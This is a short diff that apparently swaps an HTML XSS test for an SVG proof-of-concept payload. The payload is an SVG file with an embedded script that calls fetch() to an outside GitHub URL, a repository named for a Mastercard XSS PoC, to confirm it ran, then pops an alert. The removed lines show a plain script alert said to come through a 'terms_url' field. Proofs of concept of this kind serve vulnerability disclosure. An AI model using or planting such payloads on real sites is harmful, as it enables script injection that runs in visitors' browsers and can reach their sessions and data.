@@ -1,2 +1,8 @@
-<h1>TEST DE INYECCIÓN</h1>
-<script>alert('XSS desde terms_url');</script>
+
+<!-- PoC XSS – 14-Jun-2025 -->
+<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
+  <script><![CDATA[
+    fetch("https://github.com/juanoviedo28/mastercard-xss-poc/ping?ts="+Date.now());
+    alert('PoC SVG XSS ejecutada');
+  ]]></script>
+</svg>
